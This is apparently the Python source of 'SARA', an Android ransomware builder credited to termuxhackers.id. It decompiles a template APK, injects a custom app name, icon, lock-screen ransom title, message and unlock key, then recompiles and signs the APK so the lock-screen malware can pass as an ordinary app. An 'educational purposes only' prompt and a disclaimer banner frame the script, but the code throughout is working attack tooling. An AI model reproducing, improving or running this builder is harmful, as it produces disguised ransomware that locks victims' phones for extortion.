#!/usr/bin/env python3
import os
import sys
import time
import fileinput
from getpass import getpass
from PIL import Image
import shutil

# 색상 설정
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"

# 앱 정보
app_icon = ""
app_name = ""
alert_title = ""
alert_desc = ""
key_pass = ""

# 배너 출력 함수
def banner():
    print(w + d + "      ,,                ,,")
    print(w + d + "    (((((              )))))")
    print(w + d + "   ((((((              ))))))")
    print(w + d + "   ((((((              ))))))")
    print(w + d + "    (((((" + w + b + ",r@@@@@@@@@@e," + w + d + "))))))")
    print(w + d + "      (((" + w + b + "@@@@@@@@@@@@@@" + w + d + ")))    " + w + b + "SARA - version 1.0")
    print(w + b + "      \@@/" + r + ",::," + w + b + "\/" + r + ",::," + w + b + "\@@       " + w + "------------------")
    print(w + b + "     /@@@|" + r + ":::::" + w + b + "||" + r + ":::::" + w + b + "|@@@\\     " + w + "Author by " + y + "@termuxhackers.id")
    print(w + b + "    / @@@\\" + r + "':::'" + w + b + "/\\" + r + "':::'" + w + b + "/@@@ \\    " + w + "The author is not responsible")
    print(w + b + "   /  /@@@@@@@//\\\@@@@@@@\\  \\   " + w + "for any issues or damage")
    print(w + b + "  (  /  '@@@@@====@@@@@'  \  )  " + w + "caused by this program")
    print(w + b + "   \(     /          \     )/")
    print(w + b + "     \   (            )   /")
    print(w + b + "          \          /" + w)

# 파일 수정 함수
def writefile(file, old, new):
    while True:
        if os.path.isfile(file):
            replaces = {old: new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search, replaced)
                print(line, end="")
            break
        else:
            exit(r + "[!] " + w + "Failed to write in file " + file)

# 시작 함수
def start():
    global app_icon, app_name, alert_title, alert_desc, key_pass
    os.system("clear")
    banner()
    print(r + "[!] " + w + "Use this tool for educational purposes only")
    ask = str(input(r + "[!] " + w + "Do you agree (y/n): ").lower())
    if ask in ("yes"):
        pass
    else:
        exit(r + "[!] " + w + "Don't be evil!")

    print(f"""
    {r}SARA{w} is a Simple Android Ransomware Attack Tool.
    {w}The user can customize the App Icon, Name, Key, and other elements.
    {d}If you forgot the unlock key, just restart your phone!{w}
    """)
    print(b + "> " + w + os.popen("curl ifconfig.co/city --silent").readline().strip() + ", " +
          os.popen("curl ifconfig.co/country --silent").readline().rstrip() + time.strftime(", %d/%m/%Y (%H.%M.%S)"))
    print(b + ">" + w + "Use \\n for newline and CTRL + C for exit")
    print(w + "-" * 43)

    # 앱 아이콘 설정
    while True:
        x = str(input(w + "* SET app_icon (PNG only): " + g))
        if os.path.isfile(x):
            if ".png" in x:
                app_icon = x
                break
            else:
                print(r + "[!] " + w + "File not accepted, PNG format only!")
        else:
            print(r + "[!] " + w + "File not found, please provide the correct path!")

    # 앱 이름 설정
    while True:
        x = str(input(w + "* SET app_name: " + g))
        if len(x) != 0:
            app_name = x
            break
        else:
            continue

    # 알림 제목 설정
    while True:
        x = str(input(w + "* SET title: " + g))
        if len(x) != 0:
            alert_title = x
            break
        else:
            continue

    # 알림 설명 설정
    while True:
        x = str(input(w + "* SET description: " + g))
        if len(x) != 0:
            alert_desc = x
            break
        else:
            continue

    # 잠금 키 설정
    while True:
        x = str(input(w + "* SET unlock key: " + g))
        if len(x) != 0:
            key_pass = x
            break
        else:
            continue

    print(w + "* Building your ransomware APK's ...")
    print(w + "-" * 43 + d)

    # APK 디컴파일
    os.system("apktool d sara.apk")
    imgpath = [
        "sara/res/drawable-mdpi-v4/ic_launcher.png",
        "sara/res/drawable-xhdpi-v4/ic_launcher.png",
        "sara/res/drawable-hdpi-v4/ic_launcher.png",
        "sara/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]

    # 문자열 수정
    strings = "sara/res/values/strings.xml"
    print("I: Using strings " + strings)
    smali = os.popen(f"find -L sara/ -name '*0000.smali'", "r").readline().strip()
    print("I: Using smali " + os.path.basename(smali))

    # 수정된 문자열 반영
    writefile(strings, "appname", app_name)
    print("I: Adding name with " + app_name)
    writefile(strings, "alert_title", alert_title)
    print("I: Adding title with " + alert_title)
    writefile(strings, "alert_desc", alert_desc)
    print("I: Adding description with " + str(len(alert_desc)) + " words")
    writefile(smali, "key_pass", key_pass)
    print("I: Adding unlock key with " + key_pass)
    time.sleep(3)

    # 아이콘 변경 (Adaptive Icon을 고려한 아이콘 크기 변경)
    for path in imgpath:
        if os.path.isfile(path):
            with Image.open(path) as target:
                width, height = target.size
                size = str(width) + "x" + str(height)
                logo = os.path.basename(app_icon)
                shutil.copy(app_icon, logo)
                os.system("mogrify -resize " + size + " " + logo + "; cp -R " + logo + " " + path)
                os.remove(logo)
                print("I: Adding icon with " + os.path.basename(app_icon) + " size: " + size)
        else:
            exit(1)

    # APK 재컴파일
    os.system("apktool b sara -o final.apk; rm -rf sara")
    os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
    os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
    os.system("rm -rf final.apk")

    # APK 서명 확인
    if os.path.isfile("final-aligned-signed.apk"):
        out = app_name.replace(" ", "").lower() + ".apk"
        os.rename("final-aligned-signed.apk", out)
        getpass(b + ">" + w + " Result saved as: " + B + " " + out + " " + w)
    else:
        print(r + "[!] " + w + "Failed to sign APK.")

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        exit(r + "\n[!] " + w + "Thanks for using this tool\n    Follow us: https://github.com/termuxhackers-id\n    Exiting ...")
